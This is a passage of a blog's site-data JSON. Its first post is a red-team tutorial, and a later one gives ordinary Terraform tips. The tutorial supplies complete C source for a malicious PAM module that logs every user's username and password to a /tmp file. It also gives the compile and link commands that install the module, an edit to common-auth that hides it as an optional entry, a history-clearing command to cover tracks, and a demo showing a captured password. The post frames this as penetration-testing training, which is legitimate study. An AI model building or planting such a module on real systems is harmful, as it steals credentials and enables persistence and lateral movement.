utilities.\n\n```console\nroot@salsa:~# ls /etc/pam.d/\nchfn             common-session                 gdm-launch-environment          login     runuser    su-l\nchpasswd         common-session-noninteractive  gdm-password                    newusers  runuser-l\nchsh             cron                           gdm-smartcard                   other     sshd\ncommon-account   cups                           gdm-smartcard-pkcs11-exclusive  passwd    su\ncommon-auth      gdm-autologin                  gdm-smartcard-sssd-exclusive    polkit-1  sudo\ncommon-password  gdm-fingerprint                gdm-smartcard-sssd-or-password  ppp       sudo-i\n```\n\n### /etc/security\n\nA collection of additional configuration files for specific modules. Some modules, such as pam_access and pam_time, allow additional granularity for checks. When an application configuration file calls these modules, the checks are completed using the additional information from its corresponding supplemental configuration files. Other modules, like pam_pwquality, make it easier for other utilities to modify the configuration by placing all the options in a separate file instead of on the module line in the application configuration file.\n\n```console\nroot@salsa:~# ls /etc/security/\naccess.conf      faillock.conf  limits.conf  namespace.conf  namespace.init  pam_env.conf    sepermit.conf\ncapability.conf  group.conf     limits.d     namespace.d     opasswd         pwquality.conf  time.conf\n```\n\n### /var/log/secure\n\nMost security and authentication errors are reported to this log file. Permissions are configured on this file to restrict access.\n\n## Developing the Malicious Module\n\nFor this demonstration, imagine that you have gained access to a Linux system, discovering a misconfigured cronob that allowed you to escalate privileges to root. To laterally move throughout the network, you want to capture credentials of legitimate users who occasionally login to the system. To achieve this, we will craft a PAM to capture and output the credentials of the user to a `tmp` file.\n\nAfter conducting initial reconnaissance, we identify that the system is running `Ubuntu 22.04`:\n\n```console\nroot@salsa:~# unset HISTSIZE HISTFILESIZE HISTFILE # Covering tracks\nroot@salsa:~# uname -a\nLinux salsa 6.2.0-37-generic #38~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Nov  2 18:01:13 UTC 2 x86_64 x86_64 x86_64 GNU/Linux\n```\n\nBecause this device is `x86_64` and running Ubuntu, research reveals that the modules are located within the `/usr/lib/x86_64-linux-gnu/security/` directory. With this in mind, we can begin to craft our executable using C. The following code captures and outputs credentials to a `tmp` file:\n\n```C\n#include <security/pam_appl.h>\n#include <stdio.h>\n\nint pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {\n    const char *username;\n    const char *password;\n\n    // Get the username and password\n    if (pam_get_user(pamh, &username, \"Username: \") != PAM_SUCCESS) {\n        return PAM_AUTH_ERR;\n    }\n\n    if (pam_get_authtok(pamh, PAM_AUTHTOK, &password, \"Password: \") != PAM_SUCCESS) {\n        return PAM_AUTH_ERR;\n    }\n\n    // Write creds to a tmp file\n    FILE *file = fopen(\"/tmp/pam_su.tmp\", \"a\");\n    if (file != NULL) {\n        fprintf(file, \"Username: %s\\nPassword: %s\\n\\n\", username, password);\n        fclose(file);\n    } else {\n        return PAM_AUTH_ERR;\n    }\n\n    return PAM_SUCCESS;\n}\n\nint pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {\n    return PAM_SUCCESS;\n}\n```\n\nTo compile the binary, we can make use of `gcc` and `libpam0g-dev` to build the PAM module:\n\n```console\ngcc -fPIC -fno-stack-protector -c pam_su.c\n```\n\nNow that we have created the binary, we can link it with PAM without having to restart the system:\n\n```console\nld -x --shared -o /usr/lib/x86_64-linux-gnu/security/pam_su.so  pam_su.o\n```\n\nNow that the binary is created and linked, we will edit the PAM configuration file `/etc/pam.d/common-auth` to include our malicious module. This specific file is used to define authentication-related PAM modules and settings that are common across multiple services, whether this be SSH, LDAP, or even VNC. Instead of duplicating authentication configurations in each individual service file, administrators centralize common authentication settings in this file.\n\n```console\nroot@salsa:~# vim /etc/pam.d/common-auth \n\n#\n# /etc/pam.d/common-auth - authentication settings common to all services\n#\n# This file is included from other service-specific PAM config files,\n# and should contain a list of the authentication modules that define\n# the central authentication scheme for use on the system\n# (e.g., /etc/shadow, LDAP, Kerberos, etc.).  The default is to use the\n# traditional Unix authentication mechanisms.\n#\n# As of pam 1.0.1-6, this file is managed by pam-auth-update by default.\n# To take advantage of this, it is recommended that you configure any\n# local modules either before or after the default block, and use\n# pam-auth-update to manage selection of other modules.  See\n# pam-auth-update(8) for details.\n\n# here are the per-package modules (the \"Primary\" block)\nauth    [success=2 default=ignore]      pam_unix.so nullok\nauth    [success=1 default=ignore]      pam_sss.so use_first_pass\n# here's the fallback if no module succeeds\nauth    requisite                       pam_deny.so\n# prime the stack with a positive return value if there isn't one already;\n# this avoids us returning an error just because nothing sets a success code\n# since the modules above will each just jump around\nauth    required                        pam_permit.so\n# and here are more per-package modules (the \"Additional\" block)\nauth    optional                        pam_cap.so\nauth    optional                        pam_su.so\n# end of pam-auth-update config\n```\n\nWithin this file, we can inconspicuously add our optional authentication module as it is not required to succeed for authentication to occur. With this in place, we can monitor the `/tmp/pam_su.tmp` for new logins. To test the module, I created a new user named `sysadmin` and logged in via SSH:\n\n```console\n➜  ~ ssh sysadmin@10.0.0.104\nsysadmin@10.0.0.104's password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-37-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n$ cat /tmp/pam_su.tmp\nUsername: sysadmin\nPassword: hacked\n```\n\n## Conclusion\n\nI hope that this guide was an informative journey to improving your penetration testing and red-teaming skills. If you have any questions, enjoyed the content, or would like to check out more of our research, feel free to visit our GitHub."},{"id":"/2024/06/28/infrastructure-essentials-part-1","metadata":{"permalink":"/blog/2024/06/28/infrastructure-essentials-part-1","editUrl":"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=rosesecurity/rosesecurity.github.io&skip_quickstart=true/blog/2024-06-28-infrastructure-essentials-part-1.md","source":"@site/blog/2024-06-28-infrastructure-essentials-part-1.md","title":"Infrastructure Essentials Part 1: A Terraform Recipe for Success","description":"From Home Cooking to Restaurant Scale","date":"2024-06-28T00:00:00.000Z","tags":[],"readingTime":4.24,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"Crafting Malicious Pluggable Authentication Modules for Persistence, Privilege Escalation, and Lateral Movement","permalink":"/blog/2024/07/25/crafting-malicious-pluggable-authentication-modules"}},"content":"## From Home Cooking to Restaurant Scale\n\nIt has become increasingly easy to find articles on Medium or `Dev.to` about writing basic Infrastructure-as-Code, spinning up EC2 instances, and adding Terraform to your resume. While Terraform is easy to get started with, managing it at scale can lead to a lot of headaches if the initial configuration and setup were not designed with scalability in mind. In this series, we will dive into my essential tips, tricks, and tools that I consistently use in my Terraform projects. While this list is not exhaustive (it's easy to get lost in the tooling ecosystem sauce), it will help you get started on the journey of building, using, and maintaining Terraform modules and code throughout your project's lifecycle.\n\n## Keeping the Kitchen Clean\n\nIf you have ever worked in the food industry, you know that cleanliness is crucial for providing quality food. I recall a favorite restaurant of mine that had to close because sewage pipes were leaking into the stove area of the kitchen. To ensure a sustainable operation (and not have poop leaking into our code), it is essential to maintain a clean kitchen. Let's discuss tools and configurations that can help you keep your Terraform code clean, easy to maintain, and sustainable.\n\n### 1. `EditorConfig`: Ensure consistency when multiple chefs are cooking medium rare steaks in the kitchen.\n\nEditorConfig helps maintain consistent coding styles for multiple developers working on the same project across various editors and IDEs. \n\n> :exclamation: There's nothing more infuriating than developers using conflicting YAML formatters, resulting in commits with 1,000 changes due to a plugin adjusting the spacing by two lines\n\nI digress. The following is an `.editorconfig` that can be placed in the root of your project to keep everyone's IDE on the same page:\n\n```ini\n# Unix-style newlines with a newline ending every file\n[*]\ncharset = utf-8\nend_of_line = lf\nindent_size = 2\nindent_style = space\ninsert_final_newline = true\ntrim_trailing_whitespace = true\n\n[*.{tf,tfvars}]\nindent_size = 2\nindent_style = space\n\n[*.md]\nmax_line_length = 0\ntrim_trailing_whitespace = false\n\n# Override for Makefile\n[{Makefile, makefile, GNUmakefile, Makefile.*}]\ntab_width = 2\nindent_style = tab\nindent_size = 4\n\n[COMMIT_EDITMSG]\nmax_line_length = 0\n```\n\n### 2. `.gitignore`: Ensure chefs aren't sending the recipe out to customers\n\nThe purpose of `.gitignore` files is to ensure that certain files remain untracked by Git. This is useful for preventing unnecessary or sensitive files from being checked into version control. By specifying patterns in a `.gitignore` file, you can exclude files such as build artifacts, temporary files, and configuration files that may contain sensitive information (such as a state file). Below is an example of a `.gitignore` file for Terraform:\n\n```ini\n# Local .terraform directories\n**/.terraform/*\n\n# Terraform lockfile\n.terraform.lock.hcl\n\n# .tfstate files\n*.tfstate\n*.tfstate.*\n\n# Crash log files\ncrash.log\n\n# Exclude all .tfvars files, which are likely to contain sentitive data, such as\n# password, private keys, and other secrets. These should not be part of version\n# control as they are data points which are potentially sensitive and subject\n# to change depending on the environment.\n*.tfvars\n\n# Ignore override files as they are usually used to override resources locally and so\n# are not checked in\noverride.tf\noverride.tf.json\n*_override.tf\n*_override.tf.json\n\n# Ignore CLI configuration files\n.terraformrc\nterraform.rc\n```\n\n### 3. `Pre-Commit` Goodness: Have an expediter ensure that dishes are properly cooked and plated before sending them out of the kitchen\n\nBefore committing Terraform to version control, it is important to ensure that it is properly formatted, validated, linted for any potential errors, and has clean documentation. By addressing these issues before code review, a code reviewer can focus on the architecture (or lack thereof) of a change without wasting time on trivial style nitpicks. Use the following example for Terraform, but you can also find a more extensive collection of Terraform Pre-Commit hooks at [pre-commit-terraform](https://github.com/antonbabenko/pre-commit-terraform):\n\n```yaml\nrepos:\n  # pre-commit install --hook-type pre-push\n  - repo: https://github.com/pre-commit/pre-commit-hooks # Generic review/format\n    rev: v4.6.0\n    hooks:\n      - id: end-of-file-fixer\n      - id: no-commit-to-branch\n        args: [\"--branch\", \"master\"]\n      - id: trailing-whitespace\n  - repo: https://github.com/igorshubovych/markdownlint-cli # Format markdown\n    rev: v0.40.0\n    hooks:\n      - id: markdownlint\n        args: [\"--fix\", \"--disable\", \"MD036\"]\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.89.1 # Get the latest from: https://github.com/antonbabenko/pre-commit-terraform/releases\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_tflint\n      - id: terraform_validate\n        args:\n          - --args=-json\n          - --args=-no-color\n      - id: terraform_docs\n        args:\n          - --hook-config=--path-to-file=README.md\n          - --hook-config=--add-to-existing-file=true\n```\n\n## Closing Time\n\nI hope that this article emphasized the importance of maintaining clean and sustainable Terraform codebases. So far, we have introduced practical tools and configurations, such as `EditorConfig` for consistent coding styles, a `.gitignore` file to keep sensitive data out of version control, and Pre-Commit hooks for ensuring code quality before commits. These essentials serve as the foundation for building, using, and maintaining Terraform modules and code efficiently. As we continue this series, the next installment will delve into Terraform testing, exploring strategies and tools to ensure your infrastructure code is not only scalable and maintainable but also robust and error-free. If you have any questions, enjoyed the content, or would like to check out more of my code, feel free to visit my [GitHub](https://github.com/RoseSecurity)."}],"blogListPaginated":[{"items":["/2024/09/15/from-source-to-system-on-debian","/2024/08/28/homegrown-honeypots","/2024/07/29/the-future-of-terraform-visualizations","/2024/07/26/my-vim-note-taking-workflow","/2024/07/25/crafting-malicious-pluggable-authentication-modules","/2024/06/28/infrastructure-essentials-part-1"],"metadata":{"permalink":"/blog","page":1,"postsPerPage":10,"totalPages":1,"totalCount":6,"blogDescription":"Blog","blogTitle":"Blog"}}],"blogTags":{},"blogTagsListPath":"/blog/tags"}},"docusaurus-plugin-content-pages":{"default":[{"type":"jsx","permalink":"/","source":"@site/src/pages/index.js"},{"type":"mdx","permalink":"/markdown-page","source":"@site/src/pages/markdown-page.md","title":"Markdown page example","description":"You don't need React to write simple standalone pages.","frontMatter":{"title":"Markdown page example"},"unlisted":false}]},"docusaurus-plugin-debug":{},"docusaurus-theme-classic":{},"docusaurus-bootstrap-plugin":{},"docusaurus-mdx-fallback-plugin":{}}}